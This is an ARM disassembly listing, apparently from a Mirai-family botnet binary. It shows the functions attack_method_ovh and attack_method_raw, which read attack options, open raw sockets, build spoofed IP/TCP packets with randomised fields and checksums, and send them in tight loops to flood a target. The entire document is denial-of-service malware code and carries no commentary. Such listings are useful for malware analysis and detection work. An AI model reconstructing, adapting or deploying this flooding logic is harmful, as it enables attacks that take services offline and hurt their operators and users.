    ab44:	e5d1300d 	ldrb	r3, [r1, #13]
    ab48:	e59d0018 	ldr	r0, [sp, #24]
    ab4c:	e3c33004 	bic	r3, r3, #4
    ab50:	e1833100 	orr	r3, r3, r0, lsl #2
    ab54:	e5c1300d 	strb	r3, [r1, #13]
    ab58:	e5d1200d 	ldrb	r2, [r1, #13]
    ab5c:	e59d301c 	ldr	r3, [sp, #28]
    ab60:	e3c22002 	bic	r2, r2, #2
    ab64:	e1822083 	orr	r2, r2, r3, lsl #1
    ab68:	e5c1200d 	strb	r2, [r1, #13]
    ab6c:	e5d1300d 	ldrb	r3, [r1, #13]
    ab70:	e59d0020 	ldr	r0, [sp, #32]
    ab74:	e3c33001 	bic	r3, r3, #1
    ab78:	e1803003 	orr	r3, r0, r3
    ab7c:	e5c1300d 	strb	r3, [r1, #13]
    ab80:	e3a02004 	mov	r2, #4
    ab84:	e3a01002 	mov	r1, #2
    ab88:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    ab8c:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    ab90:	eb001e98 	bl	125f8 <rand_next>
    ab94:	e200000f 	and	r0, r0, #15
    ab98:	e2800e57 	add	r0, r0, #1392	; 0x570
    ab9c:	e2800008 	add	r0, r0, #8
    aba0:	e1a00800 	lsl	r0, r0, #16
    aba4:	e1a03420 	lsr	r3, r0, #8
    aba8:	e2033cff 	and	r3, r3, #65280	; 0xff00
    abac:	e1833c20 	orr	r3, r3, r0, lsr #24
    abb0:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    abb4:	e3a03004 	mov	r3, #4
    abb8:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    abbc:	e3a0200a 	mov	r2, #10
    abc0:	e3a03008 	mov	r3, #8
    abc4:	e3a00002 	mov	r0, #2
    abc8:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    abcc:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    abd0:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    abd4:	eb001e87 	bl	125f8 <rand_next>
    abd8:	e3a02006 	mov	r2, #6
    abdc:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    abe0:	e3a01003 	mov	r1, #3
    abe4:	e3a03000 	mov	r3, #0
    abe8:	e3a02001 	mov	r2, #1
    abec:	e5840030 	str	r0, [r4, #48]	; 0x30
    abf0:	e5843034 	str	r3, [r4, #52]	; 0x34
    abf4:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    abf8:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    abfc:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    ac00:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    ac04:	e0834002 	add	r4, r3, r2
    ac08:	e1540007 	cmp	r4, r7
    ac0c:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    ac10:	baffff90 	blt	aa58 <attack_method_ovh+0x2cc>
    ac14:	e3a03000 	mov	r3, #0
    ac18:	e3570000 	cmp	r7, #0
    ac1c:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    ac20:	0afffffb 	beq	ac14 <attack_method_ovh+0x488>
    ac24:	e1a00003 	mov	r0, r3
    ac28:	e1a03280 	lsl	r3, r0, #5
    ac2c:	e0433180 	sub	r3, r3, r0, lsl #3
    ac30:	e0833008 	add	r3, r3, r8
    ac34:	e5d32014 	ldrb	r2, [r3, #20]
    ac38:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    ac3c:	e352001f 	cmp	r2, #31
    ac40:	e2856014 	add	r6, r5, #20
    ac44:	9a00003b 	bls	ad38 <attack_method_ovh+0x5ac>
    ac48:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    ac4c:	e3730001 	cmn	r3, #1
    ac50:	0a000050 	beq	ad98 <attack_method_ovh+0x60c>
    ac54:	e3a04801 	mov	r4, #65536	; 0x10000
    ac58:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    ac5c:	e2444001 	sub	r4, r4, #1
    ac60:	e1500004 	cmp	r0, r4
    ac64:	0a000052 	beq	adb4 <attack_method_ovh+0x628>
    ac68:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    ac6c:	e1510004 	cmp	r1, r4
    ac70:	0a000054 	beq	adc8 <attack_method_ovh+0x63c>
    ac74:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    ac78:	e1520004 	cmp	r2, r4
    ac7c:	0a000056 	beq	addc <attack_method_ovh+0x650>
    ac80:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    ac84:	e1530004 	cmp	r3, r4
    ac88:	0a000058 	beq	adf0 <attack_method_ovh+0x664>
    ac8c:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    ac90:	e1500004 	cmp	r0, r4
    ac94:	0a00005a 	beq	ae04 <attack_method_ovh+0x678>
    ac98:	e35b0000 	cmp	fp, #0
    ac9c:	1a00005c 	bne	ae14 <attack_method_ovh+0x688>
    aca0:	e3a01000 	mov	r1, #0
    aca4:	e1c510ba 	strh	r1, [r5, #10]
    aca8:	e1a00005 	mov	r0, r5
    acac:	e3a01014 	mov	r1, #20
    acb0:	eb000eee 	bl	e870 <checksum_generic>
    acb4:	e3a02000 	mov	r2, #0
    acb8:	e1c500ba 	strh	r0, [r5, #10]
    acbc:	e1a01006 	mov	r1, r6
    acc0:	e1c621b0 	strh	r2, [r6, #16]
    acc4:	e3a03028 	mov	r3, #40	; 0x28
    acc8:	e3a02b0a 	mov	r2, #10240	; 0x2800
    accc:	e1a00005 	mov	r0, r5
    acd0:	eb000efa 	bl	e8c0 <checksum_tcpudp>
    acd4:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    acd8:	e1a0e283 	lsl	lr, r3, #5
    acdc:	e1c601b0 	strh	r0, [r6, #16]
    ace0:	e04ee183 	sub	lr, lr, r3, lsl #3
    ace4:	e1d660b2 	ldrh	r6, [r6, #2]
    ace8:	e08ee008 	add	lr, lr, r8
    acec:	e1ce60b2 	strh	r6, [lr, #2]
    acf0:	e3a03901 	mov	r3, #16384	; 0x4000
    acf4:	e3a0c010 	mov	ip, #16
    acf8:	e1a01005 	mov	r1, r5
    acfc:	e1a0000a 	mov	r0, sl
    ad00:	e3a0203c 	mov	r2, #60	; 0x3c
    ad04:	e58de000 	str	lr, [sp]
    ad08:	e58dc004 	str	ip, [sp, #4]
    ad0c:	eb00309c 	bl	16f84 <__libc_sendto>
    ad10:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    ad14:	e2830001 	add	r0, r3, #1
    ad18:	e1500007 	cmp	r0, r7
    ad1c:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    ad20:	baffffc0 	blt	ac28 <attack_method_ovh+0x49c>
    ad24:	e3a03000 	mov	r3, #0
    ad28:	e3570000 	cmp	r7, #0
    ad2c:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    ad30:	0affffb7 	beq	ac14 <attack_method_ovh+0x488>
    ad34:	eaffffba 	b	ac24 <attack_method_ovh+0x498>
    ad38:	e5934010 	ldr	r4, [r3, #16]
    ad3c:	eb001e2d 	bl	125f8 <rand_next>
    ad40:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    ad44:	e1a01283 	lsl	r1, r3, #5
    ad48:	e0411183 	sub	r1, r1, r3, lsl #3
    ad4c:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    ad50:	e1a02c24 	lsr	r2, r4, #24
    ad54:	e182242c 	orr	r2, r2, ip, lsr #8
    ad58:	e0811008 	add	r1, r1, r8
    ad5c:	e2043cff 	and	r3, r4, #65280	; 0xff00
    ad60:	e5d1c014 	ldrb	ip, [r1, #20]
    ad64:	e1822403 	orr	r2, r2, r3, lsl #8
    ad68:	e1822c04 	orr	r2, r2, r4, lsl #24
    ad6c:	e0822c30 	add	r2, r2, r0, lsr ip
    ad70:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    ad74:	e1a03c22 	lsr	r3, r2, #24
    ad78:	e1833420 	orr	r3, r3, r0, lsr #8
    ad7c:	e2021cff 	and	r1, r2, #65280	; 0xff00
    ad80:	e1833401 	orr	r3, r3, r1, lsl #8
    ad84:	e1833c02 	orr	r3, r3, r2, lsl #24
    ad88:	e5853010 	str	r3, [r5, #16]
    ad8c:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    ad90:	e3730001 	cmn	r3, #1
    ad94:	1affffae 	bne	ac54 <attack_method_ovh+0x4c8>
    ad98:	eb001e16 	bl	125f8 <rand_next>
    ad9c:	e3a04801 	mov	r4, #65536	; 0x10000
    ada0:	e585000c 	str	r0, [r5, #12]
    ada4:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    ada8:	e2444001 	sub	r4, r4, #1
    adac:	e1500004 	cmp	r0, r4
    adb0:	1affffac 	bne	ac68 <attack_method_ovh+0x4dc>
    adb4:	eb001e0f 	bl	125f8 <rand_next>
    adb8:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    adbc:	e1510004 	cmp	r1, r4
    adc0:	e1c500b4 	strh	r0, [r5, #4]
    adc4:	1affffaa 	bne	ac74 <attack_method_ovh+0x4e8>
    adc8:	eb001e0a 	bl	125f8 <rand_next>
    adcc:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    add0:	e1520004 	cmp	r2, r4
    add4:	e1c501b4 	strh	r0, [r5, #20]
    add8:	1affffa8 	bne	ac80 <attack_method_ovh+0x4f4>
    addc:	eb001e05 	bl	125f8 <rand_next>
    ade0:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    ade4:	e1530004 	cmp	r3, r4
    ade8:	e1c600b2 	strh	r0, [r6, #2]
    adec:	1affffa6 	bne	ac8c <attack_method_ovh+0x500>
    adf0:	eb001e00 	bl	125f8 <rand_next>
    adf4:	e5860004 	str	r0, [r6, #4]
    adf8:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    adfc:	e1500004 	cmp	r0, r4
    ae00:	1affffa4 	bne	ac98 <attack_method_ovh+0x50c>
    ae04:	eb001dfb 	bl	125f8 <rand_next>
    ae08:	e35b0000 	cmp	fp, #0
    ae0c:	e5860008 	str	r0, [r6, #8]
    ae10:	0affffa2 	beq	aca0 <attack_method_ovh+0x514>
    ae14:	eb001df7 	bl	125f8 <rand_next>
    ae18:	e1c601b2 	strh	r0, [r6, #18]
    ae1c:	eaffff9f 	b	aca0 <attack_method_ovh+0x514>
    ae20:	e1a0000a 	mov	r0, sl
    ae24:	eb003c05 	bl	19e40 <__GI___libc_close>
    ae28:	e28dd074 	add	sp, sp, #116	; 0x74
    ae2c:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    ae30:	e12fff1e 	bx	lr
    ae34:	0002b8ac 	.word	0x0002b8ac

0000ae38 <attack_method_raw>:
    ae38:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    ae3c:	e1a08001 	mov	r8, r1
    ae40:	e24dd074 	sub	sp, sp, #116	; 0x74
    ae44:	e3a01004 	mov	r1, #4
    ae48:	e1a04002 	mov	r4, r2
    ae4c:	e1a05003 	mov	r5, r3
    ae50:	e1a07000 	mov	r7, r0
    ae54:	eb003360 	bl	17bdc <calloc>
    ae58:	e1a01005 	mov	r1, r5
    ae5c:	e3a02002 	mov	r2, #2
    ae60:	e3a03000 	mov	r3, #0
    ae64:	e1a09000 	mov	r9, r0
    ae68:	e1a00004 	mov	r0, r4
    ae6c:	ebfffd33 	bl	a340 <attack_get_opt_int>
    ae70:	e3a03801 	mov	r3, #65536	; 0x10000
    ae74:	e1a0c000 	mov	ip, r0
    ae78:	e20cc0ff 	and	ip, ip, #255	; 0xff
    ae7c:	e2433001 	sub	r3, r3, #1
    ae80:	e3a02003 	mov	r2, #3
    ae84:	e1a01005 	mov	r1, r5
    ae88:	e1a00004 	mov	r0, r4
    ae8c:	e58dc048 	str	ip, [sp, #72]	; 0x48
    ae90:	ebfffd2a 	bl	a340 <attack_get_opt_int>
    ae94:	e1a01005 	mov	r1, r5
    ae98:	e58d0024 	str	r0, [sp, #36]	; 0x24
    ae9c:	e3a02004 	mov	r2, #4
    aea0:	e3a03040 	mov	r3, #64	; 0x40
    aea4:	e1a00004 	mov	r0, r4
    aea8:	ebfffd24 	bl	a340 <attack_get_opt_int>
    aeac:	e1a0c000 	mov	ip, r0
    aeb0:	e20cc0ff 	and	ip, ip, #255	; 0xff
    aeb4:	e1a01005 	mov	r1, r5
    aeb8:	e3a02005 	mov	r2, #5
    aebc:	e3a03001 	mov	r3, #1
    aec0:	e1a00004 	mov	r0, r4
    aec4:	e58dc050 	str	ip, [sp, #80]	; 0x50
    aec8:	ebfffd1c 	bl	a340 <attack_get_opt_int>
    aecc:	e3a03801 	mov	r3, #65536	; 0x10000
    aed0:	e1a0c000 	mov	ip, r0
    aed4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    aed8:	e2433001 	sub	r3, r3, #1
    aedc:	e3a02006 	mov	r2, #6
    aee0:	e1a01005 	mov	r1, r5
    aee4:	e1a00004 	mov	r0, r4
    aee8:	e58dc054 	str	ip, [sp, #84]	; 0x54
    aeec:	ebfffd13 	bl	a340 <attack_get_opt_int>
    aef0:	e3a03801 	mov	r3, #65536	; 0x10000
    aef4:	e1a01005 	mov	r1, r5
    aef8:	e2433001 	sub	r3, r3, #1
    aefc:	e3a02007 	mov	r2, #7
    af00:	e1a0b000 	mov	fp, r0
    af04:	e1a00004 	mov	r0, r4
    af08:	ebfffd0c 	bl	a340 <attack_get_opt_int>
    af0c:	e3a03801 	mov	r3, #65536	; 0x10000
    af10:	e1a01005 	mov	r1, r5
    af14:	e2433001 	sub	r3, r3, #1
    af18:	e3a02011 	mov	r2, #17
    af1c:	e1a06000 	mov	r6, r0
    af20:	e1a00004 	mov	r0, r4
    af24:	ebfffd05 	bl	a340 <attack_get_opt_int>
    af28:	e1a01005 	mov	r1, r5
    af2c:	e58d0028 	str	r0, [sp, #40]	; 0x28
    af30:	e3a02012 	mov	r2, #18
    af34:	e3a03000 	mov	r3, #0
    af38:	e1a00004 	mov	r0, r4
    af3c:	ebfffcff 	bl	a340 <attack_get_opt_int>
    af40:	e1a01005 	mov	r1, r5
    af44:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    af48:	e3a0200b 	mov	r2, #11
    af4c:	e3a03001 	mov	r3, #1
    af50:	e1a00004 	mov	r0, r4
    af54:	ebfffcf9 	bl	a340 <attack_get_opt_int>
    af58:	e1a01005 	mov	r1, r5
    af5c:	e58d0030 	str	r0, [sp, #48]	; 0x30
    af60:	e3a0200c 	mov	r2, #12
    af64:	e3a03001 	mov	r3, #1
    af68:	e1a00004 	mov	r0, r4
    af6c:	ebfffcf3 	bl	a340 <attack_get_opt_int>
    af70:	e1a01005 	mov	r1, r5
    af74:	e58d0034 	str	r0, [sp, #52]	; 0x34
    af78:	e3a0200d 	mov	r2, #13
    af7c:	e3a03001 	mov	r3, #1
    af80:	e1a00004 	mov	r0, r4
    af84:	ebfffced 	bl	a340 <attack_get_opt_int>
    af88:	e1a01005 	mov	r1, r5
    af8c:	e58d0038 	str	r0, [sp, #56]	; 0x38
    af90:	e3a0200e 	mov	r2, #14
    af94:	e3a03001 	mov	r3, #1
    af98:	e1a00004 	mov	r0, r4
    af9c:	ebfffce7 	bl	a340 <attack_get_opt_int>
    afa0:	e1a01005 	mov	r1, r5
    afa4:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    afa8:	e3a0200f 	mov	r2, #15
    afac:	e3a03001 	mov	r3, #1
    afb0:	e1a00004 	mov	r0, r4
    afb4:	ebfffce1 	bl	a340 <attack_get_opt_int>
    afb8:	e1a01005 	mov	r1, r5
    afbc:	e58d0040 	str	r0, [sp, #64]	; 0x40
    afc0:	e3a02010 	mov	r2, #16
    afc4:	e3a03001 	mov	r3, #1
    afc8:	e1a00004 	mov	r0, r4
    afcc:	ebfffcdb 	bl	a340 <attack_get_opt_int>
    afd0:	e59f2508 	ldr	r2, [pc, #1288]	; b4e0 <attack_method_raw+0x6a8>
    afd4:	e58d0044 	str	r0, [sp, #68]	; 0x44
    afd8:	e5923000 	ldr	r3, [r2]
    afdc:	e1a01005 	mov	r1, r5
    afe0:	e3a02019 	mov	r2, #25
    afe4:	e1a00004 	mov	r0, r4
    afe8:	ebfffcb9 	bl	a2d4 <attack_get_opt_ip>
    afec:	e3a01003 	mov	r1, #3
    aff0:	e58d0060 	str	r0, [sp, #96]	; 0x60
    aff4:	e3a02006 	mov	r2, #6
    aff8:	e3a00002 	mov	r0, #2
    affc:	eb003014 	bl	17054 <__GI_socket>
    b000:	e3700001 	cmn	r0, #1
    b004:	e1a0a000 	mov	sl, r0
    b008:	0a000131 	beq	b4d4 <attack_method_raw+0x69c>
    b00c:	e28d3070 	add	r3, sp, #112	; 0x70
    b010:	e3a02001 	mov	r2, #1
    b014:	e5232004 	str	r2, [r3, #-4]!
    b018:	e3a0c004 	mov	ip, #4
    b01c:	e3a01000 	mov	r1, #0
    b020:	e2822002 	add	r2, r2, #2
    b024:	e58dc000 	str	ip, [sp]
    b028:	eb002ff7 	bl	1700c <__GI_setsockopt>
    b02c:	e3700001 	cmn	r0, #1
    b030:	0a000125 	beq	b4cc <attack_method_raw+0x694>
    b034:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    b038:	e3a02000 	mov	r2, #0
    b03c:	e1a00801 	lsl	r0, r1, #16
    b040:	e1a0480b 	lsl	r4, fp, #16
    b044:	e1a05806 	lsl	r5, r6, #16
    b048:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    b04c:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    b050:	e1a03820 	lsr	r3, r0, #16
    b054:	e1a06824 	lsr	r6, r4, #16
    b058:	e1a01825 	lsr	r1, r5, #16
    b05c:	e3570000 	cmp	r7, #0
    b060:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    b064:	e58d6058 	str	r6, [sp, #88]	; 0x58
    b068:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    b06c:	e202b0ff 	and	fp, r2, #255	; 0xff
    b070:	0a000092 	beq	b2c0 <attack_method_raw+0x488>
    b074:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    b078:	e1a0e803 	lsl	lr, r3, #16
    b07c:	e1a03c06 	lsl	r3, r6, #24
    b080:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    b084:	e1a02c01 	lsl	r2, r1, #24
    b088:	e1a0140e 	lsl	r1, lr, #8
    b08c:	e1a01821 	lsr	r1, r1, #16
    b090:	e1a00c20 	lsr	r0, r0, #24
    b094:	e206c0ff 	and	ip, r6, #255	; 0xff
    b098:	e181ec2e 	orr	lr, r1, lr, lsr #24
    b09c:	e180c40c 	orr	ip, r0, ip, lsl #8
    b0a0:	e28d0030 	add	r0, sp, #48	; 0x30
    b0a4:	e8900003 	ldm	r0, {r0, r1}
    b0a8:	e1a03823 	lsr	r3, r3, #16
    b0ac:	e1a02822 	lsr	r2, r2, #16
    b0b0:	e2000001 	and	r0, r0, #1
    b0b4:	e2011001 	and	r1, r1, #1
    b0b8:	e1836c24 	orr	r6, r3, r4, lsr #24
    b0bc:	e1825c25 	orr	r5, r2, r5, lsr #24
    b0c0:	e58d000c 	str	r0, [sp, #12]
    b0c4:	e58d1010 	str	r1, [sp, #16]
    b0c8:	e28d2038 	add	r2, sp, #56	; 0x38
    b0cc:	e892000c 	ldm	r2, {r2, r3}
    b0d0:	e28d0040 	add	r0, sp, #64	; 0x40
    b0d4:	e8900003 	ldm	r0, {r0, r1}
    b0d8:	e2022001 	and	r2, r2, #1
    b0dc:	e2033001 	and	r3, r3, #1
    b0e0:	e2000001 	and	r0, r0, #1
    b0e4:	e2011001 	and	r1, r1, #1
    b0e8:	e58de064 	str	lr, [sp, #100]	; 0x64
    b0ec:	e58dc008 	str	ip, [sp, #8]
    b0f0:	e58d2014 	str	r2, [sp, #20]
    b0f4:	e58d3018 	str	r3, [sp, #24]
    b0f8:	e58d001c 	str	r0, [sp, #28]
    b0fc:	e58d1020 	str	r1, [sp, #32]
    b100:	e3a04000 	mov	r4, #0
    b104:	e3a01001 	mov	r1, #1
    b108:	e3a00080 	mov	r0, #128	; 0x80
    b10c:	eb0032b2 	bl	17bdc <calloc>
    b110:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    b114:	e7890104 	str	r0, [r9, r4, lsl #2]
    b118:	e1a03282 	lsl	r3, r2, #5
    b11c:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    b120:	e0433182 	sub	r3, r3, r2, lsl #3
    b124:	e0830008 	add	r0, r3, r8
    b128:	e5d43000 	ldrb	r3, [r4]
    b12c:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    b130:	e3833040 	orr	r3, r3, #64	; 0x40
    b134:	e5c43000 	strb	r3, [r4]
    b138:	e5d42000 	ldrb	r2, [r4]
    b13c:	e3c2200a 	bic	r2, r2, #10
    b140:	e3822005 	orr	r2, r2, #5
    b144:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    b148:	e5c42000 	strb	r2, [r4]
    b14c:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    b150:	e5c41001 	strb	r1, [r4, #1]
    b154:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    b158:	e3530000 	cmp	r3, #0
    b15c:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    b160:	e5c42008 	strb	r2, [r4, #8]
    b164:	e1c430b2 	strh	r3, [r4, #2]
    b168:	e3a03006 	mov	r3, #6
    b16c:	e59d1008 	ldr	r1, [sp, #8]
    b170:	13a02040 	movne	r2, #64	; 0x40
    b174:	e5c43009 	strb	r3, [r4, #9]
    b178:	11c420b6 	strhne	r2, [r4, #6]
    b17c:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    b180:	e584200c 	str	r2, [r4, #12]
    b184:	e5903010 	ldr	r3, [r0, #16]
    b188:	e1c410b4 	strh	r1, [r4, #4]
    b18c:	e5843010 	str	r3, [r4, #16]
    b190:	e1c461b4 	strh	r6, [r4, #20]
    b194:	e2841014 	add	r1, r4, #20
    b198:	e5d1300c 	ldrb	r3, [r1, #12]
    b19c:	e5d1200d 	ldrb	r2, [r1, #13]
    b1a0:	e59d000c 	ldr	r0, [sp, #12]
    b1a4:	e3c33050 	bic	r3, r3, #80	; 0x50
    b1a8:	e38330a0 	orr	r3, r3, #160	; 0xa0
    b1ac:	e3c22020 	bic	r2, r2, #32
    b1b0:	e5c1300c 	strb	r3, [r1, #12]
    b1b4:	e1822280 	orr	r2, r2, r0, lsl #5
    b1b8:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    b1bc:	e5c1200d 	strb	r2, [r1, #13]
    b1c0:	e5813004 	str	r3, [r1, #4]
    b1c4:	e5d1300d 	ldrb	r3, [r1, #13]
    b1c8:	e59d0010 	ldr	r0, [sp, #16]
    b1cc:	e3c33010 	bic	r3, r3, #16
    b1d0:	e1833200 	orr	r3, r3, r0, lsl #4
    b1d4:	e5c1300d 	strb	r3, [r1, #13]
    b1d8:	e5d1200d 	ldrb	r2, [r1, #13]
    b1dc:	e59d3014 	ldr	r3, [sp, #20]
    b1e0:	e3c22008 	bic	r2, r2, #8
    b1e4:	e1822183 	orr	r2, r2, r3, lsl #3
    b1e8:	e1c150b2 	strh	r5, [r1, #2]
    b1ec:	e5c1200d 	strb	r2, [r1, #13]
    b1f0:	e5d1300d 	ldrb	r3, [r1, #13]
    b1f4:	e59d0018 	ldr	r0, [sp, #24]
    b1f8:	e3c33004 	bic	r3, r3, #4
    b1fc:	e1833100 	orr	r3, r3, r0, lsl #2
    b200:	e5c1300d 	strb	r3, [r1, #13]
    b204:	e5d1200d 	ldrb	r2, [r1, #13]
    b208:	e59d301c 	ldr	r3, [sp, #28]
    b20c:	e3c22002 	bic	r2, r2, #2
    b210:	e1822083 	orr	r2, r2, r3, lsl #1
    b214:	e5c1200d 	strb	r2, [r1, #13]
    b218:	e5d1300d 	ldrb	r3, [r1, #13]
    b21c:	e59d0020 	ldr	r0, [sp, #32]
    b220:	e3c33001 	bic	r3, r3, #1
    b224:	e1803003 	orr	r3, r0, r3
    b228:	e5c1300d 	strb	r3, [r1, #13]
    b22c:	e3a02004 	mov	r2, #4
    b230:	e3a01002 	mov	r1, #2
    b234:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    b238:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    b23c:	eb001ced 	bl	125f8 <rand_next>
    b240:	e200000f 	and	r0, r0, #15
    b244:	e2800e57 	add	r0, r0, #1392	; 0x570
    b248:	e2800008 	add	r0, r0, #8
    b24c:	e1a00800 	lsl	r0, r0, #16
    b250:	e1a03420 	lsr	r3, r0, #8
    b254:	e2033cff 	and	r3, r3, #65280	; 0xff00
    b258:	e1833c20 	orr	r3, r3, r0, lsr #24
    b25c:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    b260:	e3a03004 	mov	r3, #4
    b264:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    b268:	e3a0200a 	mov	r2, #10
    b26c:	e3a03008 	mov	r3, #8
    b270:	e3a00002 	mov	r0, #2
    b274:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    b278:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    b27c:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    b280:	eb001cdc 	bl	125f8 <rand_next>
    b284:	e3a02006 	mov	r2, #6
    b288:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    b28c:	e3a01003 	mov	r1, #3
    b290:	e3a03000 	mov	r3, #0
    b294:	e3a02001 	mov	r2, #1
    b298:	e5840030 	str	r0, [r4, #48]	; 0x30
    b29c:	e5843034 	str	r3, [r4, #52]	; 0x34
    b2a0:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    b2a4:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    b2a8:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    b2ac:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    b2b0:	e0834002 	add	r4, r3, r2
    b2b4:	e1540007 	cmp	r4, r7
    b2b8:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    b2bc:	baffff90 	blt	b104 <attack_method_raw+0x2cc>
    b2c0:	e3a03000 	mov	r3, #0
    b2c4:	e3570000 	cmp	r7, #0
    b2c8:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    b2cc:	0afffffb 	beq	b2c0 <attack_method_raw+0x488>
    b2d0:	e1a00003 	mov	r0, r3
    b2d4:	e1a03280 	lsl	r3, r0, #5
    b2d8:	e0433180 	sub	r3, r3, r0, lsl #3
    b2dc:	e0833008 	add	r3, r3, r8
    b2e0:	e5d32014 	ldrb	r2, [r3, #20]
    b2e4:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    b2e8:	e352001f 	cmp	r2, #31
    b2ec:	e2856014 	add	r6, r5, #20
    b2f0:	9a00003b 	bls	b3e4 <attack_method_raw+0x5ac>
    b2f4:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    b2f8:	e3730001 	cmn	r3, #1
    b2fc:	0a000050 	beq	b444 <attack_method_raw+0x60c>
    b300:	e3a04801 	mov	r4, #65536	; 0x10000
    b304:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    b308:	e2444001 	sub	r4, r4, #1
    b30c:	e1500004 	cmp	r0, r4
    b310:	0a000052 	beq	b460 <attack_method_raw+0x628>
    b314:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    b318:	e1510004 	cmp	r1, r4
    b31c:	0a000054 	beq	b474 <attack_method_raw+0x63c>
    b320:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    b324:	e1520004 	cmp	r2, r4
    b328:	0a000056 	beq	b488 <attack_method_raw+0x650>
    b32c:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    b330:	e1530004 	cmp	r3, r4
    b334:	0a000058 	beq	b49c <attack_method_raw+0x664>
    b338:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    b33c:	e1500004 	cmp	r0, r4
    b340:	0a00005a 	beq	b4b0 <attack_method_raw+0x678>
    b344:	e35b0000 	cmp	fp, #0
    b348:	1a00005c 	bne	b4c0 <attack_method_raw+0x688>
    b34c:	e3a01000 	mov	r1, #0
    b350:	e1c510ba 	strh	r1, [r5, #10]
    b354:	e1a00005 	mov	r0, r5
    b358:	e3a01014 	mov	r1, #20
    b35c:	eb000d43 	bl	e870 <checksum_generic>
    b360:	e3a02000 	mov	r2, #0
    b364:	e1c500ba 	strh	r0, [r5, #10]
    b368:	e1a01006 	mov	r1, r6
    b36c:	e1c621b0 	strh	r2, [r6, #16]
    b370:	e3a03028 	mov	r3, #40	; 0x28
    b374:	e3a02b0a 	mov	r2, #10240	; 0x2800
    b378:	e1a00005 	mov	r0, r5
    b37c:	eb000d4f 	bl	e8c0 <checksum_tcpudp>
    b380:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    b384:	e1a0e283 	lsl	lr, r3, #5
    b388:	e1c601b0 	strh	r0, [r6, #16]
    b38c:	e04ee183 	sub	lr, lr, r3, lsl #3
    b390:	e1d660b2 	ldrh	r6, [r6, #2]
    b394:	e08ee008 	add	lr, lr, r8
    b398:	e1ce60b2 	strh	r6, [lr, #2]
    b39c:	e3a03901 	mov	r3, #16384	; 0x4000
    b3a0:	e3a0c010 	mov	ip, #16
    b3a4:	e1a01005 	mov	r1, r5
    b3a8:	e1a0000a 	mov	r0, sl
    b3ac:	e3a0203c 	mov	r2, #60	; 0x3c
    b3b0:	e58de000 	str	lr, [sp]
    b3b4:	e58dc004 	str	ip, [sp, #4]
